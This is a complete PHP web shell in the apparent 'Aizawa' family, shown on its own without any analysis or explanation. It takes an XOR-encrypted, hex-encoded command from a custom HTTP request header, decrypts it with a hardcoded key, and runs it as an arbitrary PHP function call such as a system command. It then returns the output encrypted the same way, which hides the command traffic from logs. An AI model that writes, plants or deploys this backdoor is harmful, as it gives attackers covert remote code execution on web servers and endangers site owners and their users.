<?php
header("Aizawa-Type: http_aizawa_ninja_eval");

$ENCRYPTION_KEY = "AIZAWA!!!EMA";

function xor_encrypt($data, $key)
{
    $encrypted = "";
    for ($i = 0; $i < strlen($data); $i++) {
        $encrypted .= chr(ord($data[$i]) ^ ord($key[$i % strlen($key)]));
    }
    return bin2hex($encrypted);
}

function xor_decrypt($encrypted_hex, $key)
{
    $encrypted = "";
    $length = strlen($encrypted_hex);

    for ($i = 0; $i < $length; $i += 2) {
        $encrypted .= chr(hexdec(substr($encrypted_hex, $i, 2)));
    }

    $decrypted = "";
    for ($i = 0; $i < strlen($encrypted); $i++) {
        $decrypted .= chr(ord($encrypted[$i]) ^ ord($key[$i % strlen($key)]));
    }

    return $decrypted;
}

$encrypted_cmd = $_SERVER["HTTP_AIZAWA_NINJA"];
$cmd = explode("~", xor_decrypt($encrypted_cmd, $ENCRYPTION_KEY));
$output = $cmd[0]($cmd[1]);
echo xor_encrypt($output, $ENCRYPTION_KEY);
